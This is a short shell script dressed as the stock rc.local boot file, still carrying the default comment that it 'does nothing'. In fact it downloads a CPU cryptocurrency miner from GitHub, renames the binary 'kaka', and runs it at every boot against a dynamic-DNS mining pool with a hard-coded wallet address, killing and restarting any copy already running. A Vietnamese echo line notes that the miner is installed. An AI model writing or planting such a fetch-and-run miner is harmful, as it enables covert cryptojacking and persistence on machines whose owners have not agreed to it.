#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/kaka ]; then
    if pgrep -x "kaka" > /dev/null
then
pkill kaka
echo " kill process"
./kaka -F http://hostcuaaquacoinne.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco

    
else

echo "Miner da install , chay thoi "
./kaka -F http://hostcuaaquacoinne.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco

     
fi
exit
fi

wget https://github.com/StupidmanTan/miner-cpu/raw/master/aquaminer-0.4-linux-amd64.zip
unzip aquaminer-0.4-linux-amd64.zip
mv aquaminer-0.4-linux-amd64 kaka
./kaka -F http://hostcuaaquacoinne.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
exit 0
